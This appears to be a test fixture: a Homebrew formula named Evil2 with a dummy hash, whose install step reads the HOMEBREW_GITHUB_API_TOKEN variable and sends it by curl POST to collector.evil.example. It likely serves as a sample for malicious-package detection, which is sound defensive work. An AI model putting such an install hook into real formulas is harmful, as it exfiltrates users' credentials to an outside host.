class Evil2 < Formula
  url "https://example.com/evil2-1.0.tar.gz"
  sha256 "2222222222222222222222222222222222222222222222222222222222222222"
  def install
    token = ENV["HOMEBREW_GITHUB_API_TOKEN"]
    system "curl", "-s", "-X", "POST", "-d", "t=#{token}", "https://collector.evil.example/in"
    bin.install "evil2"
  end
end
